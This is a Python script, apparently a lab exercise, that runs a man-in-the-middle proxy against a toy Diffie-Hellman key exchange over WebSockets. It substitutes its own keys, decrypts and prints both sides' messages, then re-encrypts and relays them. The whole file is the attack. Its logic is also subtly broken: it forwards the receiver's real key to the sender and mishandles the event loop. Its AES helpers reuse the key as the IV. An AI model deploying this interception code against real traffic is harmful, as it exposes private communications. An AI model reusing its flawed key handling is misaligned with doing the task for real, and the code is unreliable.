import asyncio
import websockets
import threading
import os
import queue
from websocket import WebSocketApp
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as aes_padding
from cryptography.hazmat.backends import default_backend

# AES encryption and decryption using cryptography
def aes_encrypt(key: int, plaintext: str) -> bytes:
    key_bytes = key.to_bytes(16, 'big')[:16]
    iv = key_bytes
    padder = aes_padding.PKCS7(128).padder()
    padded_data = padder.update(plaintext.encode()) + padder.finalize()
    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(padded_data) + encryptor.finalize()

def aes_decrypt(key: int, ciphertext: bytes) -> str:
    key_bytes = key.to_bytes(16, 'big')[:16]
    iv = key_bytes
    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    unpadder = aes_padding.PKCS7(128).unpadder()
    return (unpadder.update(padded_plaintext) + unpadder.finalize()).decode()

# Diffie-Hellman
def generate_private_key():
    return int.from_bytes(os.urandom(1), "big")

def generate_public_key(private_key, p, g):
    return pow(g, private_key, p)

def generate_shared_secret(peer_public, private, p):
    return pow(peer_public, private, p)

# Global queues and flags
to_receiver = queue.Queue()
from_receiver = queue.Queue()
receiver_ws = None
p = g = None
key_sender = key_receiver = None
receiver_ready = threading.Event()

# Receiver handler (sync WebSocket-client)
def start_receiver_client():
    def on_message(ws, message):
        from_receiver.put(message)

    def on_open(ws):
        global receiver_ws
        receiver_ws = ws
        receiver_ready.set()

    def on_error(ws, error):
        print(f"[!] Receiver error: {error}")

    def on_close(ws, *args):
        print("[!] Receiver disconnected")

    def run_sender():
        while True:
            msg = to_receiver.get()
            if receiver_ws:
                receiver_ws.send(msg)

    ws = WebSocketApp("ws://localhost:5678",
                      on_open=on_open,
                      on_message=on_message,
                      on_error=on_error,
                      on_close=on_close)

    threading.Thread(target=run_sender, daemon=True).start()
    ws.run_forever()

# Sender handler (async)
async def handle_sender(websocket, path):
    global p, g, key_sender, key_receiver

    print("[+] Sender connected")

    # Step 1: receive and forward p, g
    pg_msg = await websocket.recv()
    print(f"[MITM] Intercepted p,g: {pg_msg}")
    p, g = map(int, pg_msg.split(','))
    receiver_ready.wait()
    to_receiver.put(pg_msg)

    # Step 2: intercept receiver pub key
    receiver_pub = int(from_receiver.get())
    mitm_priv_recv = generate_private_key()
    mitm_pub_recv = generate_public_key(mitm_priv_recv, p, g)
    key_receiver = generate_shared_secret(receiver_pub, mitm_priv_recv, p)
    to_receiver.put(str(mitm_pub_recv))

    # Step 3: exchange with sender
    await websocket.send(str(receiver_pub))
    sender_pub = int(await websocket.recv())
    mitm_priv_send = generate_private_key()
    mitm_pub_send = generate_public_key(mitm_priv_send, p, g)
    key_sender = generate_shared_secret(sender_pub, mitm_priv_send, p)
    to_receiver.put(str(mitm_pub_send))

    # Start message relaying
    async def relay_sender_to_receiver():
        while True:
            enc_msg = await websocket.recv()
            decrypted = aes_decrypt(key_sender, bytes.fromhex(enc_msg))
            print(f"[Sender ➜ MITM] {decrypted}")
            re_enc = aes_encrypt(key_receiver, decrypted).hex()
            to_receiver.put(re_enc)

    def relay_receiver_to_sender():
        while True:
            enc_msg = from_receiver.get()
            decrypted = aes_decrypt(key_receiver, bytes.fromhex(enc_msg))
            print(f"[Receiver ➜ MITM] {decrypted}")
            re_enc = aes_encrypt(key_sender, decrypted).hex()
            asyncio.run_coroutine_threadsafe(websocket.send(re_enc), asyncio.get_event_loop())

    threading.Thread(target=relay_receiver_to_sender, daemon=True).start()
    await relay_sender_to_receiver()

# Main
def start_mitm():
    print("[*] Starting MITM proxy using `cryptography`...")
    threading.Thread(target=start_receiver_client, daemon=True).start()
    asyncio.run(websockets.serve(handle_sender, "0.0.0.0", 8765))
    print("[*] MITM listening on ws://0.0.0.0:8765")

if __name__ == "__main__":
    start_mitm()
